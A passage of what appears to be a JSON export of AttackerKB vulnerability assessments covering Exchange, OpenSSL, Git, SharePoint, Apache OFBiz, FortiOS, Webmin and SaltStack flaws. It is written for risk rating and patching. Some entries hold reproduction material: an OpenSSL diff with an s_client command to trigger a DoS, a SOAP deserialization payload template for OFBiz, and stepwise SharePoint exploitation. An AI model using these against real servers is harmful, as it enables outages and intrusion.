      "editorId": "b68e9cb9-1bd0-4339-abe7-329618ce2467",
      "topicId": "bd645b28-c99e-42ea-a606-832f4f534945",
      "created": "2021-03-24T15:26:39.223676Z",
      "revisionDate": "2021-03-24T19:31:04.652239Z",
      "document": "This is a post-authentication arbitrary file write vulnerability that has been actively [exploited](https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/). Now, an exploit [module](https://github.com/rapid7/metasploit-framework/pull/14860) has been added to Metasploit, which leverages both the Server-Side Request Forgery vulnerability identified as [CVE-2021-26855](https://attackerkb.com/topics/eIPBftle3R/cve-2021-26855) and this arbitrary file write vulnerability. The SSRF is mainly used to retrieve internal information such as the user SID, session ID, canary value, etc. It also allows bypassing authentication to exploit CVE-2021-27065 and creates a custom `.aspx` web page that embeds a web shell. Once this backdoor is planted, the module uses it to stage the actual payload and execute it. \r\n\r\nNote that, for this exploit to work, two Exchange Servers are needed. One is the host the module directly sends requests to and the other server is the internal resource the SSRF targets. The Exchange Admin Center (EAC) web interface, usually located at `https://<ServerFQDN>/ecp`, needs to be accessible on at least one server. Also, the email address of an Administrator on the Exchange server needs to be provided to the module. It is not really something difficult to obtain, as long as you know the name of an admin and the email pattern used internally.\r\n",
      "score": 2,
      "metadata": {},
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "1e62f529-e3a4-4375-bb22-bcc78ff82371",
      "editorId": "cca6beb8-788d-4dfa-975a-2cc9060182bf",
      "topicId": "2da5f4fa-fe54-402c-9f96-2543d41b8b7f",
      "created": "2021-03-24T18:54:44.600427Z",
      "revisionDate": "2021-03-24T19:31:20.432242Z",
      "document": "",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Impact",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "1a5f3421-d735-4ecd-a79d-b1625946c20b",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "93d7f9ff-1f51-45c7-8172-b3e45415e966",
      "created": "2021-03-26T14:54:30.705997Z",
      "revisionDate": "2021-04-02T02:39:53.109545Z",
      "document": "The exploitation of this vulnerability would be most easily accomplished using a patched version of OpenSSL to modify the extensions sent within the ClientHello of the renegotiation. Successful exploitation of this vulnerability is likely limited to a Denial of Service condition. Allocating and setting the contents of the NULL page is extremely unlikely from the vantage point of a remote attacker.\r\n\r\nThe following patch can be applied to OpenSSL 1.1.1k (commit [fd78df59](https://github.com/openssl/openssl/commit/fd78df59b0f656aefe96e39533130454aa957c00)) to generate a build capable of reproducing the vulnerability.\r\n```\r\nindex ce8a75794c..3e3f774dab 100644\r\n--- a/ssl/statem/extensions_clnt.c\r\n+++ b/ssl/statem/extensions_clnt.c\r\n@@ -272,7 +272,7 @@ EXT_RETURN tls_construct_ctos_sig_algs(SSL *s, WPACKET *pkt,\r\n         return EXT_RETURN_NOT_SENT;\r\n \r\n     salglen = tls12_get_psigalgs(s, 1, &salg);\r\n-    if (!WPACKET_put_bytes_u16(pkt, TLSEXT_TYPE_signature_algorithms)\r\n+    if (!WPACKET_put_bytes_u16(pkt, (s->renegotiate ? TLSEXT_TYPE_signature_algorithms_cert : TLSEXT_TYPE_signature_algorithms))\r\n                /* Sub-packet for sig-algs extension */\r\n             || !WPACKET_start_sub_packet_u16(pkt)\r\n                /* Sub-packet for the actual list */\r\n```\r\n\r\nWhat this change is doing is swapping the `signature_algorithms` extension for `signature_algorithms_cert` when the SSL context is renegotiating.\r\n\r\nWith a patched version of OpenSSL built, run the openssl client, specifying TLS version 1.2 and renegotiate.\r\n\r\n```\r\necho R | apps/openssl s_client -connect target:443 -msg -tls1_2\r\n```",
      "score": 4,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        }
      ]
    },
    {
      "id": "915d822f-7d74-4ad3-9518-ff7d600d28db",
      "editorId": "e426cc12-067c-41a8-83c0-029757da0dbf",
      "topicId": "3a3e50f2-fc37-42b7-ac9e-a373a168289d",
      "created": "2021-03-26T17:46:28.685461Z",
      "revisionDate": "2021-09-03T10:42:05.956237Z",
      "document": "While this vulnerability has the potential to be dangerous, I think the limitations for exploitation outweigh its value. To successfully exploit this vulnerability, an attacker must be able to host a malicious repo and convince a user to clone said repo. Additionally, each platform has its own requirements.\r\n\r\nThere are a few hosting options, and they all have their caveats that would limit the exploit in some way. An attacker could use a \"trusted\" hosting service such as Github, Gitlab, etc. Hosting on a trusted service could be either through compromising an existing, perhaps commonly-used repo or by hosting a single, malicious repo of their own. The former option adds complexity because it would require the attacker to be able to add multiple files to the repo unnoticed. The latter option would be an easier and more credible / trustworthy option versus using a self-hosting method. Despite that, the repo would likely be identified and removed, limiting the exploit even further. As mentioned before, the self-hosting option exists, but would be the most limited since users would be more cautious with repositories from an untrusted source.\r\n\r\nAside from the hosting limitations, a user must have some form of clean / smudge filters set up globally with Git so that the repo's contents can be checked out out-of-order on a clone. According to the advisory, Git for Windows has clean / smudge filters set up by default through `Git-lfs`, so Windows users are most vulnerable. For MacOS, clean / smudge filters must be set up manually. Thanks to Foone's fantastic [analysis](https://twitter.com/Foone/status/1369500506469527552?s=20), it turns out that Linux can also be vulnerable, provided that clean / smudge filters are set up globally, and the malicious repo is cloned on a case-insensitive file system, i.e., a mounted drive.\r\n\r\nBecause so many limitations exist for successful exploitation, I wouldn't rate this as a critical vulnerability. It is dangerous, but because it relies on user interaction and a specific local configuration of the vulnerable software, I'm giving it a middle score for both `Attacker Value` and `Exploitability`. I've selected both `vulnerable in default configuration` and `vulnerable in uncommon configuration` since it's dependent on the platform that the Git client is installed on. Windows is vulnerable by default, and the other platforms require additional setup to be truly vulnerable.\r\n\r\nAs always, upgrade to the patched version, **especially Windows users** in this case. If that's not possible, users can still disable global clean / smudge filters and disable symlinks in Git.",
      "score": 5,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 3,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "9b33a344-1bea-4729-8f59-3d065ec54930",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "ff274f38-9a0c-47ed-97b9-57c114ab1511",
      "created": "2021-03-29T16:05:31.898562Z",
      "revisionDate": "2021-04-02T02:39:44.644717Z",
      "document": "This is an [actively exploited zero-day](https://www.bleepingcomputer.com/news/security/apple-fixes-a-ios-zero-day-vulnerability-actively-used-in-attacks/) in the WebKit browser engine affecting iPhone 6s and later models, as well as a slew of iPad models (and some Apple Watch versions, according to the Bleeping Computer article, though Apple's [characteristically sparse advisory](https://support.apple.com/en-us/HT212256) makes no mention of the watch). Discovered by Google's Threat Analysis Group, requires a user to open maliciously crafted web content. Update those iDevices, kids. \r\n",
      "score": 2,
      "metadata": {},
      "tags": [
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "e8082068-5acd-46b2-b366-5b7aa37fe0f8",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "91bc37fc-44f9-41c0-9c8a-c9cf32eec42d",
      "created": "2021-03-30T16:31:18.860607Z",
      "revisionDate": "2021-04-02T02:39:31.844253Z",
      "document": "An interesting vulnerability in Microsoft SharePoint Server 2019, Microsoft SharePoint Enterprise Server 2016, Microsoft Business Productivity Servers 2010 Service Pack 2, and Microsoft SharePoint Foundation 2013 Service Pack 1 that allows for RCE via a deserialization vulnerability. However for an added twist the vulnerability occurs due to a replay-style attack.\r\n\r\nThe specifics of the vulnerability are discussed in some detail at https://www.zerodayinitiative.com/blog/2021/3/17/cve-2021-27076-a-replay-style-deserialization-attack-against-sharepoint, however I'll try cut out a lot of the cruft and boil it down to the key essentials here. Basically in most apps there is a requirement to provide some level of message authentication. This ensures that messages are not tampered with or otherwise altered after they are sent, however there is a fatal flaw that applications can make where they assume that just cause a message is signed, aka it was not tampered, it ensures that the intent of the user was to perform that action.\r\n\r\nThis issue, aka the lack of intent attached to a message, can lead to incorrect assumptions whereby an application assumes that just cause a message is signed correctly, its intent must be correct. Unfortunately its hard to infer intent based just on some random signed message, as all the signing does is tell us that the sender definitely sent some specific sequence of bytes and that it likely wasn't tampered with after sending them. This is the basis of the idea behind replay attacks: just cause the message is valid doesn't mean it can't be replayed in different scenarios to achieve useful results. \r\n\r\nA good example of this is say you have messages to perform action A, B and C and they need to be performed in that order or your factory will explode. Message authentication is great to say okay your doing action A, B, or C and not some other action, but it does nothing to ensure that step B is done after step A and not after step C. That is where intent comes into play.\r\n\r\nNow that this logic is understood, we can look at CVE-2021-27076 within SharePoint. This issue occurs in the **InfoPath** functionality that SharePoint offers, which stores documents in a serialized state within session data, after which they are then retrieved by key using the `editingSessionId` key and deserialized. As noted in ZDI's blog post, this deserialization is done by the `BinaryFormatter.Deserialize()` function, and if arbitrary data can be provided here then an attacker could get RCE.\r\n\r\nNow whilst the blog post doesn't in and of itself say which user gets RCE, if one looks at the advisory from Microsoft they will note some very interesting key words: `In a network-based attack an attacker can gain access to create a site and could execute code remotely within the kernel.`, This to me indicates that whilst the original component that is impacted may not immediately grant kernel level RCE, it is possible to elevate one's permissions to SYSTEM or similar though the access granted by exploiting this vulnerability. This would ultimately allow an attacker to go from having low permissions on the SharePoint server to gaining full SYSTEM level code execution on the server.\r\n\r\nOkay so we know this grants SYSTEM level code execution. Lets continue. The first hurdle we see is that we don't have direct access to the session data, as this is stored server side. How can we store the arbitrary data we need to store in the session data to trigger the vuln? Well turns out we can use the app itself to store data into the session data, since we can't directly access it ourselves. We know the app shouldn't store arbitrary data in the session data that it could end up later deserializing but remember intents from earlier? Well turns out it may not have intended it, but there is a way to do this!\r\n\r\nIn particular, when uploading files, we normally retrieve the data from the session state using the key associated with a data item that was placed in the session state (remember the earlier discussion about session state being used to hold documents), and the data in the session state is intended to be used for file attachment upload operations (aka file goes to session state, and is then retrieved from session state and used in a file attachment upload operation).\r\n\r\nSimilarly, `DocumentSessionState` is used as the deserialization operation, and then when this occurs what normally is expected is that data is retrieved using a key corresponding to an item placed into the session state, with the intent of it being used in a `DocumentSessionState` deserialization, not a file attachment upload.\r\n\r\nIn both cases, `editingSessionId` is used as the key to determine which item should be retrieved from the session state. However, this variable is entirely controlled from client side. Therefore, we can upload arbitrary data via one intent (the attachment upload) and then use that same `editingSessionId` in a different context, namely to enter the `DocumentSessionState` deserialization code path.\r\n\r\nHowever now we have a problem, as when uploading an attachment, we can't see which session state key, aka `editingSessionId`, is used for that particular attachment. It exists only on the server inside the `DocumentSessionState` object, which we can't see as a client side user. To solve this the researcher ended up sending the document state key into the attachment mechanism, which is located at `FormServerAttachments.aspx`, so that the server replays a serialized `DocumentSessionState` as an attachment and returns it to the client, and then within this data will be the attachment's state key, aka its `editingSessionId` key corresponding to that specific attachment.\r\n\r\nAs noted in the ZDI report the final steps end up being roughly the following:\r\n\r\n1. Create an InfoPath list.\r\n2. Begin adding a new item to the list.\r\n3. Attach a file to the item. The file contains a fake InfoPath `DocumentSessionState` including arbitrary objects to be deserialized. The file\u2019s extension can be\r\nset to anything InfoPath allows for extensions, for example, `.png`. After attaching this file, do not save the form.\r\n4. Scrape the document\u2019s state key from the page\u2019s HTML.\r\n5. Feed the document\u2019s state key to the `FormServerAttachments.aspx` page, maliciously replaying the `DocumentSessionState` into the attachment mechanism. The entire serialized `DocumentSessionState` is returned to the client as if it were an attached file.\r\n6. From within the returned data, extract the state key of the attachment added in step 3.\r\n7. Feed the attachment\u2019s state key into an undocumented client-side API, maliciously replaying the attachment into the deserialization mechanism. Remote code execution is achieved when the arbitrary objects present in the attachment are deserialized on the server.\r\n\r\nIts interesting that they included most of these steps but just leave the last step as an `undocumented client-side API`. The client-side API part of this gives us some hints, along with the fact that it replays the attachment into the deserialization mechanism, but without further info or discussion on this part, its hard to tell what this function is right now without doing further analysis. I haven't seen any discussions on this bug online either so I don't know if others have figured this out or not; most likely people are still working on it.\r\n\r\nIn conclusion though I would strongly recommend that users patch this vulnerability. Whilst this bug does require some level of authentication to exploit, which mitigates some of its risk, the fact that it allows users to go from basic authentication to full SYSTEM level control over the affected SharePoint server should not be overlooked. I can see this being a potential for threat groups to utilize in more targeted attacks in the future, given the need for some level of authentication, as this allows for easy pivoting and information gathering should attackers manage to gain some initial credentials to a SharePoint server.",
      "score": 3,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 4,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "42778cd1-b3d1-4f5d-a0b5-19aa9b206858",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "a85ede41-3f67-480b-8858-46b5d866eb51",
      "created": "2021-03-30T22:13:07.747635Z",
      "revisionDate": "2021-03-30T22:13:07.755305Z",
      "document": "Heap-based buffer overflow used in \"limited, targeted attacks\" according to Adobe's advisory: https://helpx.adobe.com/security/products/acrobat/apsb21-09.html ",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "092e22bc-460f-464c-8e0f-5bd6e67fefa5",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "2d017915-364c-447e-89de-ef0ad72e46af",
      "created": "2021-03-30T22:42:26.722961Z",
      "revisionDate": "2021-03-30T22:42:26.729662Z",
      "document": "Interesting, this slid under the radar a bit. I'm not seeing any definitive evidence that this was confirmed to be exploited in the wild, but the [Bleeping Computer article](https://www.bleepingcomputer.com/news/security/sophos-fixes-sql-injection-vulnerability-in-their-cyberoam-os/) on it from December 14, 2020 says Sophos was investigating whether it had been exploited. There was kiiiiind of a lot going on December 14, 2020, what with the SolarWinds supply chain attack revelations ramping up, so I'm not surprised there was no further community attention paid to this. In any event, [upgrading to supported products](https://support.sophos.com/support/s/article/KB-000040678?language=en_US) probably a good call. ",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "ec0a201b-0814-43ee-88b9-99d82d18622c",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "9a355845-4c8f-48c3-9829-4a54539e1fb8",
      "created": "2021-03-31T13:24:21.700207Z",
      "revisionDate": "2021-04-02T02:39:25.856889Z",
      "document": "This vulnerability is pretty straightforward to exploit. It is due to an unauthenticated SOAP interface in the Apache OFBiz application that accepts and deserializes an arbitrary Java object. This can be leveraged by an attacker to submit a payload to the server that after being deserialized will result in a command being executed. The [YSoSerial](https://github.com/frohoff/ysoserial) `ROME` gadget chain can be used for this purpose.\r\n\r\nThe serialized object is encoded in hex and placed within the `cus-obj` XML node of the SOAP request:\r\n\r\n```\r\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">\r\n  <soapenv:Header/>\r\n  <soapenv:Body>\r\n    <ser>\r\n      <map-HashMap>\r\n        <map-Entry>\r\n          <map-Key>\r\n            <cus-obj>$hexGadgetChain</cus-obj>\r\n          </map-Key>\r\n          <map-Value>\r\n            <std-String value=\"http://example.com\"/>\r\n          </map-Value>\r\n        </map-Entry>\r\n      </map-HashMap>\r\n    </ser>\r\n  </soapenv:Body>\r\n</soapenv:Envelope>\r\n```\r\nThis was taken from a [PoC](https://github.com/yumusb/CVE-2021-26295-POC/blob/main/poc.py) which was credited in the Metasploit exploit module.",
      "score": 4,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "ff98621a-00e4-4ffc-8c5b-058fcdf21143",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "da3a63d5-4ece-465d-8289-bd8119f15e95",
      "created": "2021-03-31T22:35:16.994581Z",
      "revisionDate": "2021-04-12T15:49:17.281295Z",
      "document": "Please see the [Rapid7 analysis](https://attackerkb.com/topics/51Vx3lNI7B/cve-2021-21975#rapid7-analysis) or [CVE-2021-21983's assessment](https://attackerkb.com/assessments/fce71f33-eb17-490f-a80e-c4cd5059e0dc).\r\n\r\n**Update:** According to GreyNoise, [attackers are scanning for CVE-2021-21975](https://twitter.com/nathanqthai/status/1379888484865957891).",
      "score": 2,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "fce71f33-eb17-490f-a80e-c4cd5059e0dc",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "8b7d69f2-01fb-4346-8a49-ee255baffda8",
      "created": "2021-04-03T07:41:02.089841Z",
      "revisionDate": "2021-10-14T16:51:18.918244Z",
      "document": "Please see [CVE-2021-21975's Rapid7 analysis](https://attackerkb.com/topics/51Vx3lNI7B/cve-2021-21975#rapid7-analysis). CVE-2021-21975 can be chained with CVE-2021-21983 to achieve unauthed RCE.",
      "score": 2,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "8e82f172-bd14-46aa-b5a8-fdb3cc9dde9b",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "925f84d3-4fe0-4a18-baa9-170c701e718d",
      "created": "2021-04-05T13:20:07.088525Z",
      "revisionDate": "2021-04-05T13:51:27.217277Z",
      "document": "There is now [public threat intelligence](https://twitter.com/jeromesegura/status/1378584985792180227) that the Purple Fox exploit kit has incorporated this vulnerability and is [exploiting it](https://twitter.com/nao_sec/status/1378546891349106692).",
      "score": 2,
      "metadata": {},
      "tags": []
    },
    {
      "id": "91b4f49f-9243-4d47-9084-3ef8026411c2",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "b54a15a1-8d06-4902-83f9-dc10e40fa81a",
      "created": "2021-04-05T14:09:21.756457Z",
      "revisionDate": "2021-04-05T20:32:26.59949Z",
      "document": "CISA and the FBI [put out a joint warning](https://us-cert.cisa.gov/ncas/current-activity/2021/04/02/fbi-cisa-joint-advisory-exploitation-fortinet-fortios) that this is one of several FortiOS vulnerabilities APTs are exploiting to gain initial access to government and other services. We know, however, that plenty of [non-APT attackers](https://www.bleepingcomputer.com/news/security/passwords-exposed-for-almost-50-000-vulnerable-fortinet-vpns/) have also targeted Fortinet devices over the past several years. See the page for [CVE-2018-13379](https://attackerkb.com/topics/VEc81wfDS7/cve-2018-13379-path-traversal-in-fortinet-fortios) as an example. These things are high value and give attackers internal network access\u2014keep 'em updated on a hair trigger!",
      "score": 2,
      "metadata": {
        "exploitability": 5
      },
      "tags": []
    },
    {
      "id": "d1901390-bd96-4ad5-831f-49048764a0a8",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "91756851-9b25-4801-b911-e3226a0656b5",
      "created": "2021-04-05T14:16:48.911448Z",
      "revisionDate": "2021-04-12T16:17:35.959508Z",
      "document": "One of three vulnerabilities CISA and the FBI [have warned](https://us-cert.cisa.gov/ncas/current-activity/2021/04/02/fbi-cisa-joint-advisory-exploitation-fortinet-fortios) are being exploited by APTs to gain initial access to government and other services. The other two vulnerabilities in the alert are [CVE-2018-13379](https://attackerkb.com/topics/VEc81wfDS7/cve-2018-13379-path-traversal-in-fortinet-fortios?referrer=5591), a pre-authentication path traversal bug that has been actively and widely exploited for years now, and [CVE-2020-12812](https://attackerkb.com/topics/8qnr47UsVL/cve-2020-12812#view-assessment-91b4f49f-9243-4d47-9084-3ef8026411c2) (an MFA bypass).\r\n\r\n",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Initial Access"
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "59ddcd80-3b88-4b47-8998-aacd20300391",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "385b14f7-5597-47d8-b628-886bd20f86b8",
      "created": "2021-04-06T19:24:31.591742Z",
      "revisionDate": "2021-04-12T16:17:29.625818Z",
      "document": "At the very least I'd debate the legitimacy of this exploit given reports like https://twitter.com/albinowax/status/1263068436298633216 and https://nvd.nist.gov/vuln/detail/CVE-2020-12440 which suggest this CVE was withdrawn due to it not actually being a valid bug. I'm not sure why this was exploited in the wild as well as I see no evidence of this having been the case minus a light PoC whose validity is disputed (again probably also why this CVE was later revoked as not a security vulnerability).",
      "score": 2,
      "metadata": {
        "attacker-value": 1
      },
      "tags": []
    },
    {
      "id": "f9c47c50-f559-443f-ba90-053f2008a6bf",
      "editorId": "7cabe6c8-6a96-42b7-a1cc-d16bdda83474",
      "topicId": "ea90a258-8e7f-49cd-a730-6d8457a421d7",
      "created": "2021-04-09T02:48:38.158372Z",
      "revisionDate": "2021-04-20T15:28:53.444402Z",
      "document": "MetaSploit module available:\r\nexploit/linux/http/webmin_backdoor\r\n\r\nDescription:\r\n  This module exploits a backdoor in Webmin versions 1.890 through \r\n  1.920. Only the SourceForge downloads were backdoored, but they are \r\n  listed as official downloads on the project's site. Unknown \r\n  attacker(s) inserted Perl qx statements into the build server's \r\n  source code on two separate occasions: once in April 2018, \r\n  introducing the backdoor in the 1.890 release, and in July 2018, \r\n  reintroducing the backdoor in releases 1.900 through 1.920. Only \r\n  version 1.890 is exploitable in the default install. Later affected \r\n  versions require the expired password changing feature to be \r\n  enabled.",
      "score": 0,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "2bcd222e-91d5-4728-8339-a5e88ea84090",
      "editorId": "b68e9cb9-1bd0-4339-abe7-329618ce2467",
      "topicId": "245ca8f9-a32e-455b-b7c9-e1cd95710f9d",
      "created": "2021-04-09T16:04:04.344448Z",
      "revisionDate": "2021-04-12T16:17:23.948505Z",
      "document": "\r\nAn exploit [module](https://github.com/rapid7/metasploit-framework/pull/14950) that leverages both this authentication bypass and a directory traversal vulnerability identified as [CVE-2021-25282](https://attackerkb.com/topics/HtY90kt4ZL/cve-2021-25282?referrer=akb) has been added to Metasploit recently. It allows an attacker to execute commands remotely on the `master` as the root user.\r\n\r\nThis module takes advantage of a Maintenance Process Check that is executed every 60 seconds by default. This process reloads and executes all the [grains](https://docs.saltproject.io/en/latest/topics/grains/) on the `master`, including [custom grain modules](https://docs.saltproject.io/en/latest/topics/grains/#writing-grains) in the Extension Module directory. Code execution is achieved by sending a request to the `wheel_async` client, abusing the directory traversal issue in the `path` parameter, as described in @kevthehermit's [assessment](https://attackerkb.com/assessments/ce40bed4-43b1-4123-a67d-31b326d36d82). A malicious Python script is placed in the Extension Module directory (default is `/var/cache/salt/master/extmods/`), waiting for the Maintenance Process Check to execute 